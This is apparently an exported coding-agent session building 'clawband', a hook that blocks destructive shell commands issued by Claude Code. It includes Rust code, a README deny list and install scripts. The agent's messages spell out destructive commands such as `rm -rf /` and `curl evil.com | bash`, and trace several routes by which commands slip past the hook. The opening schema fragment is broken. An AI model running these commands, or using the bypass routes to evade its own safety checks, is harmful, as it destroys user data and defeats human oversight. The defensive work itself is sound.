      "description": "Marketplace names whose plugins may surface as contextual install suggestions (relevance-based tips), in addition to the official marketplace. Only honored when set in managed settings (policy scope); the key is ignored in user, project, and local settings. A name only takes effect when the marketplace is registered on the machine AND its registered source is also declared in managed settings, either as the extraKnownMarketplaces entry for that name or as an entry of strictKnownMarketplaces. A marketplace registered from a different source under an allowlisted name is ignored.",
      "type": "array",
      "items": {
        "type": "string"
      }
    },
    "forceLoginMethod": {
      "description": "Force a specific login method: \"claudeai\" for Claude Pro/Max, \"console\" for Console billing",

      "enum": [
        "claudeai",
        "console"
      ]
    },
    "parentSettingsBehavior": {
      "description": "Controls whether the SDK parent tier (Options.managedSettings / --managed-settings) layers under this admin tier. \"first-wins\" (default): parent is dropped — admin tiers are the only policy source. \"merge\": parent's restrictive-only-filtered settings union under the admin winner. Has no effect when no admin tier exists (parent applies as the sole policy tier, still filtered restrictive-only).",
      "type": "string",
      "enum": [
        "first-wins",
        "merge"
      ]
    },
    "forceLoginOrgUUID": {
      "description": "Organization UUID to require for OAuth login. Accepts a single UUID string or an array of UUIDs (any one is permitted). When set in managed settings, login fails if the authenticated account does not belong to a listed organization.",

        {
          "type": "string"
        },
        {
          "type": "array",
          "items": {
            "type": "string"
          }
        }
      ]
    },

      "description": "When set in managed settings, the CLI blocks startup until remote managed settings are freshly fetched, and exits if the fetch fails",

      "properties": {
        "enabled": {
          "type": "boolean"

          "description": "Exit with an error at startup if sandbox.enabled is true but the sandbox cannot start (missing dependencies or unsupported platform).               "items": {
                "type": "string"
              }
            },
            "allowManagedDomainsOnly": {
              "description": "When true (and set in managed settings), only allowedDomains and WebFetch(domain:...) allow rules from managed settings are respected. User, project, local, and flag settings domains are ignored. Denied domains are still respected from all sources.",
              "type": "boolean"
            },
            "allowUnixSockets": {
              "description": "macOS only: Unix socket paths to allow. Ignored on Linux (seccomp cannot filter by path).",
              "type": "array",
              "items": {
                "type": "string"
              }
            },
            "allowAllUnixSockets": {
              "description": "If true, allow all Unix sockets (disables blocking on both platforms).",
              "type": "boolean"
            },
            "allowLocalBinding": {
              "type": "boolean"
            },
            "allowMachLookup": {
              "description": "macOS only: Additional XPC/Mach service names to allow looking up. Supports trailing-wildcard prefix matching (e.g., \"com.apple.coresimulator.*\"). Needed for tools that communicate via XPC such as the iOS Simulator or Playwright.",
              "type": "array",
              "items": {
                "type": "string"
              }
            },
            "httpProxyPort": {
              "type": "number"
            },
            "socksProxyPort": {
              "type": "number"
            },
            "tlsTerminate": {

                  "type": "string",

                }

```

Clawband splits on `&&` into two segments:

1. `echo "rm -rf /" > /tmp/bad.sh` — the deny patterns match command names like `\brm\b`, not string literals inside quotes. This **passes**.
2. `bash /tmp/bad.sh` — clawband tries `scan_script_file("/tmp/bad.sh")` but the file doesn't exist yet (echo hasn't run). `fs::read_to_string` fails gracefully and returns `None`. This **passes**.

So the full compound command bypasses both checks entirely.

**What would be caught:**
- Running `bash /tmp/bad.sh` in a separate command AFTER the file already exists — clawband scans it then.

**Two fixes worth adding:**

1. **Echo content scanning** — for `echo "..." > *.sh` (and printf), extract the quoted string and run it through deny/ask patterns. Handles the simple single-line case.

2. **Write-then-execute pattern** — if a compound command contains both a file-write operation (`echo/printf/cat/tee ... > file`) AND a script execution (`bash file`, `sh file`, `./file`), flag it as "ask". Doesn't require parsing the content at all, just the structure.

Option 2 is simpler and catches a broader class (heredocs, printf, cat, tee). Option 1 catches the content even without the immediate execution. Both together give solid coverage.

Want me to implement both?

Two separate issues:

**`>` (output redirection) — partially handled**
- `> /dev/sd` — caught (explicit deny pattern)
- `echo "rm -rf /" > bad.sh` — not handled (the gap we just discussed)
- `> /important/file` bare truncation — not caught (only `truncate -s 0` is in the deny list)

**`<` (input redirection) — not handled**

`bash < /tmp/bad.sh` bypasses script scanning. Let me trace it:

`extract_script_path` regex expects `bash [flags] <path>`. For `bash < /tmp/bad.sh`:
- flags group captures nothing (` <` doesn't start with `-`)
- path group captures `< /tmp/bad.sh`
- `split_whitespace().next()` returns `<`
- `scan_script_file("<", ...)` → file not found → passes silently

So `bash < /tmp/bad.sh` completely bypasses script file scanning even if the file exists and contains `rm -rf /`.

**Fixes needed:**

1. `extract_script_path` — add a `bash\s+<\s*(.+)` branch to handle input redirection
2. Write-then-execute detection (the echo gap)
3. Maybe: bare `>` truncation of sensitive paths

The `bash < file` fix is straightforward. Want me to bundle all three into one PR?

_**Agent (claude-sonnet-4-6 2026-06-04 06:36:27Z)**_

_**Agent (claude-sonnet-4-6 2026-06-04 06:36:33Z)**_

That bypasses us. Let me trace it:

1. Splits on `;` → `echo bad > bad.txt` | `bash bad.txt`
2. **Echo content check** — only triggers on script extensions (`.sh .py .js` etc). `.txt` → passes
3. **Write-then-execute check** — same problem, `write_re` only matches script extensions → passes  
4. **Script scan of `bash bad.txt`** — file doesn't exist yet at hook time → passes gracefully

The extension filtering on the write side is the gap. Bash doesn't care about extensions — it'll run any file.

The right fix is to match the **written filename against the executed filename** instead of filtering by extension:

- `echo bad > bad.txt` writes `bad.txt`  
- `bash bad.txt` executes `bad.txt` — same file → flag it

vs legitimate use:

- `echo "log entry" > progress.log && python3 analyze.py` — different files → safe

This approach catches `bad.txt`, `bad.log`, `bad` (no extension), anything — while keeping false positives low because legitimate commands rarely write to the same file they're about to execute in one command.

Want me to add this to PR #4 before you merge, or fix it in the next one?

_**Agent (claude-sonnet-4-6 2026-06-04 06:36:55Z)**_

_**Agent (claude-sonnet-4-6 2026-06-04 06:37:02Z)**_

No — `./bad.sh` on its own isn't scanned. `extract_script_path` only matches when a known interpreter name appears first (`bash`, `sh`, `python3`, etc.). `./bad.sh` skips that entirely.

Tracing it:
- `check_command` — no deny/ask patterns match `./bad.sh`
- `extract_script_path` — regex requires interpreter prefix → returns `None`
- No script scan → **passes**

So if the file exists and contains `rm -rf /`, it runs unchecked.

**What IS caught:**
- `echo "danger" > bad.sh && ./bad.sh` — write-then-execute does catch this because `exec_re` has a `^\./\S+` branch that matches `./bad.sh` as the execute segment ✓
- `bash bad.sh` — scanned ✓

**The gap:** `./script`, `./script.py`, bare `script` (via PATH or shebang) — none are scanned even if the file exists.

**Fix:** extend `extract_script_path` to also match:
- `^\./\S+\.(sh|py|js|ts|rb|pl|lua)` — direct relative path with script extension
- `^\./\S+` where the file has a shebang — harder, requires reading the file first

The extension-based one is easy and covers 90% of cases. The shebang case would require peeking at the first line of any `./file` command, which is doable but adds filesystem access unconditionally.

Want me to add `./script` handling to `extract_script_path` and fold it all into one PR with the filename-matching write-then-execute fix and the `[clawband]` prefix?

249	// When an interpreter runs a script file, read it and check each line against

253	fn extract_script_path(command: &str) -> Option<String> {
254	    let interp = r"(?i)(?:sudo\s+)?(?:bash|sh|zsh|dash|python3?|node|deno|perl|lua[0-9.]*)";
255	
256	    // Input redirection: bash < /path/to/script.sh
257	    let redir_re = Regex::new(&format!(r"(?i)^\s*{}\s+<\s+(.+)$", interp)).unwrap();
258	    if let Some(caps) = redir_re.captures(command) {
259	        let path_str = caps[1].trim().trim_matches('"').trim_matches('\'');
260	        if let Some(path) = path_str.split_whitespace().next() {
261	            return Some(path.to_string());
262	        }
263	    }
264	
265	    // Standard: interpreter [optional-flags] <path>
266	    let re = Regex::new(&format!(r"(?i)^\s*{}\s+((?:-[a-zA-Z]+\s+)*)(.+)$", interp)).unwrap();
267	    let caps = re.captures(command)?;
268	    let flags = &caps[1];
269	    // -c  → shell/python inline command string
270	    // -m  → python module (e.g. python3 -m pytest)
271	    // -e / --eval → node inline eval
272	    if Regex::new(r"(?:^|\s)-[a-zA-Z]*[cme][a-zA-Z]*(\s|$)")
273	        .unwrap()
274	        .is_match(flags)
275	    {
276	        return None;
277	    }
278	    let path_str = caps[2].trim().trim_matches('"').trim_matches('\'');
279	    // First token only — ignore script arguments after the path
280	    let path = path_str.split_whitespace().next()?;
281	    Some(path.to_string())
282	}

692	// ─── Write-then-execute detection ─────────────────────────────────────────────
693	// If a compound command writes to a script file AND later executes a script,
694	// the written content can't be scanned before execution. Flag as ask.
695	
696	fn check_write_then_execute(segments: &[String]) -> bool {
697	    if segments.len() < 2 {
698	        return false;
699	    }
700	    let write_re = Regex::new(&format!(r"(?i)>>?\s*\S+\.(?:{SCRIPT_EXTS})\b")).unwrap();
701	    let exec_re = Regex::new(&format!(
702	        r"(?i)\b(?:bash|sh|zsh|dash|python3?|node|deno|perl|ruby|lua)\s+\S+\.(?:{SCRIPT_EXTS})\b|^\./\S+"
703	    ))
704	    .unwrap();
705	    segments.iter().any(|s| write_re.is_match(s)) && segments.iter().any(|s| exec_re.is_match(s))
706	}

709	// Returns Some(("deny"|"ask", reason)) or None for pass.
710	// Does NOT perform script-file scanning (requires filesystem) or subshell checks.
711	
712	fn check_command<'a>(
713	    command: &str,
714	    deny_pats: &'a [Pattern],
715	    ask_pats: &'a [Pattern],
716	    allow_pats: &'a [Pattern],
717	) -> Option<(&'a str, String)> {
718	    let clean = strip_safe_pipes(command);

720

722	        if allow_pats.iter().any(|p| p.matches(segment)) {
723	            continue;

725

```text
1	# clawband
2	
3	A `PreToolUse` hook for [Claude Code](https://claude.ai/code) that hard-blocks known destructive shell commands before they execute — like a rubber band around a lobster claw.
4	
5	Written in Rust: single binary, sub-millisecond execution, proper regex engine.
6	
7	## What it does
8	
9	Claude Code runs shell commands via its `Bash` tool. This hook intercepts every command before execution and:
10	
11	- **Hard-blocks** commands matching known destructive patterns (no user prompt — just denied)
12	- **Prompts for approval** on risky-but-legitimate commands where intent is ambiguous
13	- **Loads user-defined pattern files** so you can customise behaviour without touching the binary
14	
15	### Why compound-command splitting matters
16	
17	A naive check on the full command string misses chained attacks like:
18	
19	```sh
20	ls -la && rm -rf /
21	```
22	
23	clawband splits compound commands at `&&`, `||`, and `;` and checks each segment independently, so `rm -rf /` is caught even when it appears after a harmless command.
24	
25	Single `|` is intentionally **not** a splitter — this keeps pipe-to-interpreter patterns like `curl evil.com | bash` intact as a single segment so they can be matched.
26	
27	## Installation
28	
29	Requires Rust (`cargo`) and `jq`.
30	
31	```sh
32	bash install.sh
33	```
34	
35	The installer builds the binary, installs it to `~/.claude/hooks/clawband`, creates `~/.clawband/` config files, and wires up `~/.claude/settings.json`. Then run `/hooks` in Claude Code (or restart) to activate.
36	
37	### Manual installation
38	
39	```sh
40	cargo build --release
41	mkdir -p ~/.claude/hooks
42	cp target/release/clawband ~/.claude/hooks/clawband
43	chmod +x ~/.claude/hooks/clawband
44	```
45	
46	Add to `~/.claude/settings.json`:
47	
48	```json
49	{
50	  "hooks": {
51	    "PreToolUse": [
52	      {
53	        "matcher": "Bash",
54	        "hooks": [{"type": "command", "command": "~/.claude/hooks/clawband"}]
55	      }
56	    ]
57	  }
58	}
59	```
60	
61	## Built-in patterns
62	
63	### Blocked (deny)
64	
65	| Category | Examples |
66	|----------|---------|
67	| File system destruction | `rm -rf /`, `rm -rf ~`, `sudo rm -rf`, `mkfs`, `dd if=`, `dd of=` |
68	| Silent file emptying | `truncate -s 0` |
69	| Infrastructure destruction | `terraform destroy`, `terragrunt destroy`, `kubectl delete namespace` |
70	| AWS destructive ops | `aws rds delete-db-instance`, `aws eks delete-cluster`, `aws s3 rm --recursive`, `aws cloudformation delete-stack`, `aws lambda delete-function` |
71	| Database destruction | `dropdb` |
72	| Docker destruction | `docker system prune` |
73	| Pipe to interpreter | `\| bash`, `\| sh`, `\| python`, `\| node`, `\| ruby`, `\| perl` (with or without space) |
74	| Pipe to interpreter via sudo | `\| sudo bash`, `\| sudo python`, etc. |
75	| Heredoc to interpreter | `bash <<`, `python <<`, etc. |
76	| Pipe to database CLI | `\| psql`, `\| mysql`, `\| sqlite3` |
77	| Pipe to system tools | `\| patch`, `\| crontab`, `\| at` |
78	| find / xargs escalation | `find ... -delete`, `-exec bash`, `-exec rm`, `xargs sh`, `xargs python`, etc. |
79	| git force push | `git push --force` / `-f` (allows `--force-with-lease`) |
80	
81	### Prompted (ask)
82	
83	| Category | Examples |
84	|----------|---------|
85	| eval | `eval ` — common in shell init but executes arbitrary strings |
86	| Destructive git (local) | `git reset --hard`, `git checkout -- `, `git stash drop`, `git stash clear` |
87	| git clean | `git clean -f`, `git clean -x`, `git clean -d` — wipes untracked files irreversibly |
88	| Remote branch deletion | `git push --delete` |
89	| git restore (working tree) | `git restore <path>` — discards uncommitted changes (`git restore --staged` is safe and not prompted) |
90	| git branch -D | `git branch -D <branch>` — force-deletes branch regardless of merge status |
91	| docker rm -f | `docker rm -f`, `docker container rm -f` — force-removes running containers |
92	
93	### Safe patterns preserved
94	
95	- `| python3 -c "..."` — visible inline code is allowed (not a supply-chain risk)
96	- `| python3 -m module` — module invocation is allowed
97	- `--force-with-lease` — safe alternative to force push
98	- `find . -exec cmd {} \;` — the `\;` terminator is not treated as a command separator
99	
100	## Custom patterns
101	
102	Extend or override behaviour by editing files in `~/.clawband/`:
103	
104	| File | Effect |
105	|------|--------|
106	| `deny.patterns` | Always block — added to built-in deny list |
107	| `ask.patterns` | Always prompt — added to built-in ask list |
108	| `allow.patterns` | Override any block — matching commands skip all checks |
109	
110	Each file is one **case-insensitive regex** per line. Lines starting with `#` and blank lines are ignored.
111	
112	See `deny.patterns.example` and `ask.patterns.example` for the format.
113	
114	```sh
115	# ~/.clawband/deny.patterns — add project-specific blocks
116	docker system prune
117	my-infra nuke --all
118	
119	# ~/.clawband/allow.patterns — whitelist specific safe usages
120	git reset --hard HEAD$
121	```
122	
123	## CLI commands
124	
125	```sh
126	clawband allow '<pattern>'   # append to ~/.clawband/allow.patterns
127	clawband deny  '<pattern>'   # append to ~/.clawband/deny.patterns
128	clawband stats               # show pattern counts and audit log summary
129	clawband --version
130	```
131	
132	Patterns are validated as regexes before writing. The install script also adds `/allow` and `/deny` Claude Code slash commands so you can add patterns without leaving the chat.
133	
134	## PostToolUse hook (optional)
135	
136	Install with `--post-hook` to enable in-chat allow suggestions:
137	
138	```sh
139	bash install.sh --post-hook
140	```
141	
142	When you approve a prompted command, the hook tells Claude the command ran and suggests the exact `clawband allow` command to permanently silence that prompt. Uses a breadcrumb file (`~/.clawband/.last-ask`) written at prompt time and consumed on approval — if you deny, PostToolUse never fires and the breadcrumb expires after 60 seconds.
143	
144	## Options
145	
146	Set as environment variables (in your shell profile, or prefixed on the hook command):
147	
148	| Variable | Default | Effect |
149	|----------|---------|--------|
150	| `RTK_ENABLED` | `0` | Strip `rtk` prefix before matching ([RTK](https://github.com/rtk-ai/rtk) users) |
151	| `SQZ_ENABLED` | `0` | Strip `sqz compress` suffix before matching ([sqz](https://github.com/ojuschugh1/sqz) users) |
152	| `CLAWBAND_LOG` | `0` | Append every block/prompt to `~/.clawband.log` |
153	| `CLAWBAND_SKIP` | `0` | Bypass all checks (for trusted wrapper scripts) |
154	
155	## Requirements
156	
157	- `bash install.sh`: Rust toolchain (`cargo`), `jq`
158	- Runtime: none (single static binary)
159	
160	## Limitations
161	
162	- **Subshells are prompted, not blocked** — `$(...)` and backtick expressions embed commands that can't be safely split. The hook asks for confirmation rather than hard-blocking.
163	- **Obfuscated commands** — base64-encoded payloads or variable expansion bypass pattern matching. This is a first line of defence, not a sandbox.
164	- **No environment variable inspection** — `MY_CMD=rm; $MY_CMD -rf /` is not caught.
165	- **`git push :<branch>` deletion** — the colon-prefix syntax for remote branch deletion is not blocked; use `--delete` instead.
166	
167	## Contributing
168	
169	Patterns are in `src/main.rs` in `builtin_deny()` and `builtin_ask()`. If you find a destructive pattern that should be blocked or prompted, open a PR with the pattern and a comment explaining the risk.
170	
171	## Licence
172	
173	MIT
174
```
</details></tool-use>

```yaml
name: Release

on:
  push:
    tags:
      - 'v*'
  workflow_dispatch:
    inputs:
      tag:
        description: 'Release tag (e.g. v2.10.0)'
        required: true

jobs:
  build:
    name: Build ${{ matrix.artifact }}
    strategy:
      matrix:
        include:
          - os: ubuntu-latest
            target: x86_64-unknown-linux-musl
            artifact: clawband-linux-x86_64
          - os: macos-latest
            target: aarch64-apple-darwin
            artifact: clawband-macos-arm64
          - os: macos-13
            target: x86_64-apple-darwin
            artifact: clawband-macos-x86_64
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@v4

      - name: Install musl tools
        if: matrix.target == 'x86_64-unknown-linux-musl'
        run: sudo apt-get install -y musl-tools

      - name: Install Rust toolchain
        uses: dtolnay/rust-toolchain@stable
        with:
          targets: ${{ matrix.target }}

      - name: Cache cargo registry
        uses: actions/cache@v4
        with:
          path: |
            ~/.cargo/registry
            ~/.cargo/git
            target
          key: ${{ runner.os }}-${{ matrix.target }}-cargo-${{ hashFiles('**/Cargo.lock') }}
          restore-keys: ${{ runner.os }}-${{ matrix.target }}-cargo-

      - name: Build
        run: cargo build --release --target ${{ matrix.target }}

      - name: Stage binary
        run: cp target/${{ matrix.target }}/release/clawband ${{ matrix.artifact }}

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: ${{ matrix.artifact }}
          path: ${{ matrix.artifact }}

  release:
    name: Create GitHub release
    needs: build
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - uses: actions/download-artifact@v4
        with:
          merge-multiple: true

      - name: Create release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: ${{ github.event.inputs.tag || github.ref_name }}
          generate_release_notes: true
          files: |
            clawband-linux-x86_64
            clawband-macos-x86_64
            clawband-macos-arm64

```

#!/bin/bash
# install.sh — install clawband
# Options:
#   --post-hook   also register the PostToolUse hook for allow suggestions
set -euo pipefail

POST_HOOK=0
for arg in "$@"; do
  [[ "$arg" == "--post-hook" ]] && POST_HOOK=1
done

HOOK_DIR="$HOME/.claude/hooks"
SETTINGS="$HOME/.claude/settings.json"
CONFIG_DIR="$HOME/.clawband"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO="jamessoubry/clawband"

green()  { printf '\033[32m%s\033[0m\n' "$1"; }
yellow() { printf '\033[33m%s\033[0m\n' "$1"; }
red()    { printf '\033[31m%s\033[0m\n' "$1"; }

# ── jq is always required (settings.json editing) ────────────────────────────
if ! command -v jq &>/dev/null; then
  red "Error: jq is required."
  echo "  macOS:  brew install jq"
  echo "  Ubuntu: sudo apt install jq"
  exit 1
fi

mkdir -p "$HOOK_DIR"

# ── Try pre-built binary ──────────────────────────────────────────────────────
BINARY_INSTALLED=0
OS=$(uname -s | tr '[:upper:]' '[:lower:]')
ARCH=$(uname -m)

case "$OS-$ARCH" in
  linux-x86_64)  ASSET="clawband-linux-x86_64" ;;
  darwin-arm64)  ASSET="clawband-macos-arm64" ;;
  darwin-x86_64) ASSET="clawband-macos-x86_64" ;;
  *)             ASSET="" ;;
esac

if [[ -n "$ASSET" ]]; then
  echo "Checking for pre-built binary..."
  LATEST=$(curl -fsSL "https://api.github.com/repos/$REPO/releases/latest" 2>/dev/null \
    | jq -r '.tag_name // empty' 2>/dev/null || true)
  if [[ -n "$LATEST" ]]; then
    URL="https://github.com/$REPO/releases/download/$LATEST/$ASSET"
    if curl -fsSL "$URL" -o "$HOOK_DIR/clawband" 2>/dev/null; then
      chmod +x "$HOOK_DIR/clawband"
      green "Installed pre-built binary ($LATEST)"
      BINARY_INSTALLED=1
    else
      yellow "Pre-built binary not available for this platform — building from source"
    fi
  else
    yellow "No release found — building from source"
  fi
fi

# ── Build from source (fallback) ──────────────────────────────────────────────
if [[ "$BINARY_INSTALLED" == "0" ]]; then
  if ! command -v cargo &>/dev/null; then
    red "Error: no pre-built binary available and Rust toolchain not found."
    echo "  Install Rust: curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh"
    echo "  Then re-run this script."
    exit 1
  fi
  echo "Building from source..."
  cargo build --release --manifest-path "$SCRIPT_DIR/Cargo.toml" --quiet
  cp "$SCRIPT_DIR/target/release/clawband" "$HOOK_DIR/clawband"
  chmod +x "$HOOK_DIR/clawband"
  green "Built and installed from source"
fi

# ── Create config dir ─────────────────────────────────────────────────────────
mkdir -p "$CONFIG_DIR"

for f in deny ask; do
  if [ ! -f "$CONFIG_DIR/$f.patterns" ]; then
    cp "$SCRIPT_DIR/$f.patterns.example" "$CONFIG_DIR/$f.patterns"
    green "Created: $CONFIG_DIR/$f.patterns"
  else
    yellow "Skipped: $CONFIG_DIR/$f.patterns already exists"
  fi
done

if [ ! -f "$CONFIG_DIR/allow.patterns" ]; then
  cat > "$CONFIG_DIR/allow.patterns" << 'EOF'
# allow.patterns — patterns that override deny/ask blocks
# One pattern per line. Case-insensitive regex. Lines starting with # ignored.
#
# Example: allow git reset --hard only to HEAD
# git reset --hard HEAD$
EOF
  green "Created: $CONFIG_DIR/allow.patterns"
fi

# ── Wire up settings.json ─────────────────────────────────────────────────────
HOOK_ENTRY='{"matcher":"Bash","hooks":[{"type":"command","command":"~/.claude/hooks/clawband"}]}'

if [ ! -f "$SETTINGS" ]; then
  echo '{"hooks":{"PreToolUse":[]}}' > "$SETTINGS"
fi

if grep -q '"clawband"' "$SETTINGS" 2>/dev/null; then
  yellow "Already registered in $SETTINGS — skipping"
else
  UPDATED=$(jq --argjson entry "$HOOK_ENTRY" '
    .hooks.PreToolUse = ([$entry] + (.hooks.PreToolUse // []))
  ' "$SETTINGS")
  echo "$UPDATED" > "$SETTINGS"
  green "Registered hook in $SETTINGS"
fi

# ── Optional: PostToolUse hook ───────────────────────────────────────────────
if [[ "$POST_HOOK" == "1" ]]; then
  POST_ENTRY='{"matcher":"Bash","hooks":[{"type":"command","command":"~/.claude/hooks/clawband post"}]}'
  if grep -q '"clawband post"' "$SETTINGS" 2>/dev/null; then
    yellow "PostToolUse hook already registered — skipping"
  else
    UPDATED=$(jq --argjson entry "$POST_ENTRY" '
      .hooks.PostToolUse = ([$entry] + (.hooks.PostToolUse // []))
    ' "$SETTINGS")
    echo "$UPDATED" > "$SETTINGS"
    green "PostToolUse hook registered — will suggest 'clawband allow' after approvals"
  fi
fi

# ── Install slash commands ────────────────────────────────────────────────────
CMD_DIR="$HOME/.claude/commands"
mkdir -p "$CMD_DIR"
cp "$SCRIPT_DIR/.claude/commands/allow.md" "$CMD_DIR/allow.md"
cp "$SCRIPT_DIR/.claude/commands/deny.md"  "$CMD_DIR/deny.md"
green "Installed: /allow and /deny slash commands → $CMD_DIR"

echo ""
green "Done. Run /hooks in Claude Code (or restart) to activate clawband."
echo ""
echo "  Config:  $CONFIG_DIR/{deny,ask,allow}.patterns"
echo "  CLI:     clawband allow '<pattern>'  add to allow list"
echo "           clawband deny  '<pattern>'  add to deny list"
echo "  Slash:   /allow <pattern>  /deny <pattern>"
echo "  Options: RTK_ENABLED=1   strip rtk prefix before matching"
echo "           CLAWBAND_LOG=1  append blocks/prompts to ~/.clawband.log"
echo "           CLAWBAND_SKIP=1 bypass all checks (trusted scripts)"
echo ""
echo "  Optional: bash install.sh --post-hook"
echo "            Registers a PostToolUse hook that suggests 'clawband allow'"
echo "            in the chat after you approve a prompted command."

```

should we hsve chosen go over rust?

---

_**Agent (claude-sonnet-4-6 2026-06-04 21:46:28Z)**_

_**Agent (claude-sonnet-4-6 2026-06-04 21:46:35Z)**_

Honest answer: **Go would have been better for this specific project, but Rust is fine and not worth rewriting.**

**Where Go would have won:**

- **Cross-compilation is trivial** — `GOOS=darwin GOARCH=arm64 go build` just works. No musl-tools, no separate macOS runners, no `dtolnay/rust-toolchain` setup. The release workflow we just wrote could be one runner instead of three.
- **Compile times** — Go is much faster to build locally and in CI
- **Contributor friendliness** — Go is more accessible for a small open-source tool

**Where Rust holds its own:**

- **Binary size** — Rust with `strip + lto + opt-level z` is a few hundred KB. Go embeds its runtime: typically 5–8MB. For a hook installed in `~/.claude/hooks/`, that's noticeable.
- **Startup time** — Rust has no GC or runtime warmup. Genuinely faster per invocation. Matters here because the hook fires on every Bash command.
- **The grep bug** — the specific reason for the rewrite was a bash regex correctness bug. Rust's `regex` crate solved that cleanly, and Go's RE2-based `regexp` package would have too.

**The real answer:** Go's cross-compilation story is so much simpler that it would have saved us real work on the release pipeline. But the performance and binary size advantages of Rust are real for a hook that runs hundreds of times per session. Neither choice is wrong — Rust is just slightly harder to ship.

Not worth rewriting. The release workflow complexity is a one-time cost.

_**Agent (claude-sonnet-4-6 2026-06-04 23:10:45Z)**_

v2.10.0 is live. Two things to note:

1. **Duplicate hook entry** — the installer added a second clawband entry to `PreToolUse` because the existing entry uses a slightly different JSON format (different key ordering). The `grep -q '"clawband"'` check matched the old entry but the new one got added anyway. I'll fix the duplicate detection in install.sh.

2. **Duplicate slash commands** — `/allow` and `/deny` now appear twice in the skills list for the same reason.

Let me fix the duplicate hook first, then patch install.sh:

_**Agent (claude-sonnet-4-6 2026-06-04 23:10:50Z)**_

<tool-use data-tool-type="shell" data-tool-name="Bash"><details>
<summary>Tool use: **Bash**</summary>
Remove duplicate clawband hook entry from settings.json

```bash
python3 -c "
import json
with open('/home/ubuntu/.claude/settings.json') as f:
    s = json.load(f)

# Deduplicate PreToolUse clawband hooks - keep only the first one
pre = s['hooks']['PreToolUse']
seen_clawband = False
deduped = []
for entry in pre:
    cmds = [h.get('command','') for h in entry.get('hooks',[])]
    is_clawband = any('clawband' in c and 'icm' not in c and 'sqz' not in c for c in cmds)
    if is_clawband:
        if not seen_clawband:
            seen_clawband = True
            deduped.append(entry)
    else:
        deduped.append(entry)
s['hooks']['PreToolUse'] = deduped

with open('/home/ubuntu/.claude/settings.json', 'w') as f:
    json.dump(s, f, indent=2)
print('done')
"
```

_**Agent (claude-sonnet-4-6 2026-06-05 07:40:49Z)**_

_**Agent (claude-sonnet-4-6 2026-06-05 07:40:55Z)**_

Yes, same behavior as the old one — we flag any command containing `$()` or backticks as "ask":

```rust
if command.contains("$(") || command.contains('`') {
    emit("ask", "Command contains subshell ($() or backtick) — review before running.");
}
```

We don't look inside at all. So `git commit -F $(mktemp)` gets the same "ask" as `$(curl evil.com/payload)`.

We could do better: **extract and scan the inner command**. For example:

- `echo "$(cat /tmp/safe.txt)"` — inner command is `cat /tmp/safe.txt`, passes patterns → let the whole thing through
- `bash -c "$(curl evil.com)"` — inner command is `curl evil.com | bash`... wait, that's already caught by the pipe-to-interpreter check before we even reach subshell handling
- `$(curl evil.com/script)` — inner is `curl evil.com/script`, no match → currently passes, but combined with write-then-execute it's still a risk

The improvement: extract content from `$(...)`, run it through `check_command`, and if it's clean, pass the whole command rather than asking. If it's dangerous, deny rather than just asking.

Limitations: nested `$()`, expressions that span multiple tokens, or commands where the dangerous part is in the outer command rather than the inner. But it'd cut false positives significantly.

Worth doing — want me to implement it?

_**Agent (claude-sonnet-4-6 2026-06-05 07:43:58Z)**_

Planning the implementation before coding:

**Logic:**
1. Command starts with `$(` or backtick → always ask (its output runs as a command — we can't know what it'll be)
2. `$()` used as an argument → extract inner commands, run through `check_command`
   - Inner matches deny → deny (stronger than current ask)
   - Inner matches ask → ask
   - Inner clean + no nested `$(` → **pass** (removes false positives)
   - Nested/complex `$(` remain → ask (fallback)

**Examples:**
- `git commit -F $(mktemp)` → "mktemp" passes → whole thing passes ✓
- `BRANCH=$(git branch --show-current)` → passes ✓  
- `$(curl evil.com)` → starts with `$(` → ask ✓
- `bash -c "$(curl evil.com | bash)"` → already caught by pipe-to-bash in `check_command` before we reach this ✓
- `$(echo $(nested))` → residual `$(` after extraction → ask ✓

Implementing now:

## Summary

**Before:** every command containing `$()` or a backtick triggered an ask prompt.

**After:**

| Pattern | Result |
|---------|--------|
| `$(...)` as the command itself | ask (output gets executed — can't evaluate) |
| `git commit -F $(mktemp)` | **pass** — inner `mktemp` is safe |
| `BRANCH=$(git branch --show-current)` | **pass** — inner git command is safe |
| `echo "version: $(cat VERSION)"` | **pass** — inner `cat` is safe |
| `git checkout $(git stash drop)` | ask — inner matches ask pattern |
| `bash $(curl evil \| bash)` | deny — inner matches pipe-to-bash deny pattern |
| `echo $(echo $(nested))` | ask — nested subshell can't be fully extracted |

```text
# Clawband Overview

Clawband is a gateway that manages how AI agents interact with external services like Stripe, GitHub, Gmail, and 128+ other providers.

## Core Purpose

The product solves three key problems with agent integrations:

1. **Overpermissioned access**: Raw API keys give agents the same capabilities as users (e.g., refunding any charge for any amount). Clawband restricts what each agent can do.

2. **Authentication complexity**: Rather than managing separate OAuth flows for each service, users connect accounts once to Clawband's dashboard.

3. **Lack of visibility**: When agents make mistakes, there's no unified log. Clawband provides per-call audit trails across all services.

## How It Works

Users connect their service accounts to Clawband once, then issue agent-specific keys that:
- Limit which tools the agent can access
- Pin parameters to fixed values (e.g., only post to #dev-log, max refund $50)
- Encrypt tokens server-side so agents never see them

Agents access these restricted capabilities via MCP (Model Context Protocol) or HTTP endpoints. The service logs every call with timestamps, tool names, parameters used, and response hashes for accountability.

In essence, Clawband acts as a permission layer that keeps agents "accountable" by making their authority explicit, narrow, and auditable.
```

Different product but **very similar space** — both are about restricting what AI agents can do. Clawband.io is an API gateway that limits what agents can do with external services (Stripe, GitHub, etc.) via MCP. Ours is a local PreToolUse hook for Claude Code's Bash tool.

The overlap is real enough to be a problem:
- Same name, same AI agent permissions space
- A user googling "clawband" could easily land on the wrong one
- They may have trademark protection given they appear to be a funded product

**Options:**

1. **Rename** — find a new name, migrate everything (repo, binary, config dir, website, README). Clean break, no ambiguity.

2. **Keep it** — different enough use case (local shell hook vs cloud API gateway), minimal real-world confusion in practice.

If you want to rename, now is a good time — before the open PRs (#10–#13) get merged and before more people install it. The migration would touch: repo name, binary name (`clawband` → new name), config dir (`~/.clawband/` → `~/.newname/`), hook path, env vars, website, README, all pattern files. Roughly an hour of work.

Do you want to rename? If so, got a name in mind?

**clawband v2.12.0  — PreToolUse hook for Claude Code's Bash tool
Blocks destructive shell commands before they execute.

**Usage
  clawband <command>

**Commands
